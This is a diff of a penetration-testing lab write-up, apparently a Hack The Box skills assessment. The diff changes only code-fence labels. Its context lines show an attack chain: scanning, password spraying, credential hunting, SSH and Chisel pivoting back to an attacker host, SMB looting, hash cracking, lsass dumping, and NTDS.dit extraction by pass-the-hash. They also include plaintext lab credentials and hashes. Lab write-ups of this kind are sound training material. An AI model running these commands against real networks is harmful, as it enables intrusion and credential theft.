@@ -42,7 +42,7 @@ What is the NTLM hash of NEXURA\Administrator? **Answer: 36e09e1e6ade94d63fbcab5
 
 1. Discover that the target has SSH opened:
    
-```sh
+```shellsession
 $ sudo nmap -Pn -sV 10.129.234.116
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-03 22:30 CST
 Nmap scan report for 10.129.234.116
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds
 
 1. Try password spraying attack with the given employee name `Betty Jayde`:
    
-```sh
+```shellsession
 $ echo ../names.txt
 betty jayde
 $ ./username-anarchy -i ../names.txt > names.txt
@@ -77,7 +77,7 @@ $ ssh jbetty@10.129.234.116
 
 1. After successful login as `jbetty`, try to find other credential on the target → found `hwilliam`:`dealer-screwed-gym1`:
    
-```sh
+```shellsession
 $ for i in $(find . -name * 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
 
 File:  .
@@ -111,14 +111,14 @@ File:  ./.profile
 
 3. Base on the naming convention of the target in the internal network → guess that the `FILE01` host might be a file server with SMB enabled, try simple netcat command to confirm that:
 
-```sh
+```shellsession
 jbetty@DMZ01:~$ nc -nv 172.16.119.10 445
 Connection to 172.16.119.10 445 port [tcp/*] succeeded!
 ```
 
 4. Establish a SOCKS Proxy via SSH to transfer tool packets from attack host through the pivot host:
 
-```sh
+```shellsession
 $ cat /etc/hosts
 
 # Host addresses
@@ -136,7 +136,7 @@ $ ssh -D 9051 jbetty@10.129.234.116
 
 **(Optional) Configure Chisel with Proxychains to route our pentest tools through the DMZ01 to internal network targets:**
 
-```sh
+```shellsession
 $ cat /etc/hosts
 
 # Host addresses
@@ -161,13 +161,13 @@ $ sudo ./chisel server --reverse
 
 Execute Chisel on DMZ01 to connect back to our host:
 
-```sh
+```shellsession
 jbetty@DMZ01:~$ ./chisel client 10.10.14.59:8080 R:socks
 ```
 
 5. Use smbclient to probe for shares using the found credential (`hwilliam`:`dealer-screwed-gym1`) and download suspicious `.psafe3` file (a `.psafe3` file is a database used by Password Safe to store secured and encrypted user name/password list):
 
-```sh
+```shellsession
 $ proxychains smbclient -L //172.16.119.10/ -U 'nexura.htb/hwilliam'
 [proxychains] config file found: /etc/proxychains.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
@@ -234,7 +234,7 @@ getting file \Archive\Employee-Passwords_OLD.psafe3 of size 1080 as Employee-Pas
 
 6. Extract password hash from the `.psafe3` file and crack it offline to obtain valid credential to open the `.psafe3` file:
 
-```sh
+```shellsession
 $ pwsafe2john Employee-Passwords_OLD.psafe3  > pwsafe.hash
 $ john --wordlist=/usr/share/wordlists/rockyou.txt pwsafe.hash 
 Using default input encoding: UTF-8
@@ -250,7 +250,7 @@ Session completed.
 
 7. Download the password safe file opener to read the saved password entries:
 
-```sh
+```shellsession
 $ sudo flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
 $ sudo flatpak install flathub org.pwsafe.pwsafe -y
 $ flatpak run org.pwsafe.pwsafe
@@ -258,7 +258,7 @@ $ flatpak run org.pwsafe.pwsafe
 
 Found credentials for these domain users:
 
-```sh
+```shellsession
 Domain users:
 bdavid caramel-cigars-reply1
 stom fails-nibble-disturb4
@@ -270,7 +270,7 @@ jbetty xiao-nicer-wheels5
 
 8. With bdavid's credential, we can now remote to the `JUMP01` machine. The `xfreerdp` command below creates a shared folder on the target machine, which makes it easy to upload or download files:
 
-    ```sh
+    ```shellsession
     $ proxychains xfreerdp /u:bdavid /p:'caramel-cigars-reply1' /d:nexura.htb /v:172.16.119.7 /cert:ignore "/drive:sf_kalifolder,/home/htb-ac-1863259/bdavid"
     ```
 
@@ -285,7 +285,7 @@ jbetty xiao-nicer-wheels5
 
 9. Extract the NTLM hash from the retrieved `lsass.dmp` file using Pypykatz for user `stom`:
 
-    ```sh
+    ```shellsession
     $ pypykatz lsa minidump /home/htb-ac-1863259/bdavid/lsass.dmp
 
     <SNIP>
@@ -299,7 +299,7 @@ jbetty xiao-nicer-wheels5
 
 10. Use `netexec` with the `ntdsutil` module to dump the NTDS.dit for the Administrator's stored hash:
 
-    ```sh
+    ```shellsession
     $ proxychains netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
 
     <SNIP>
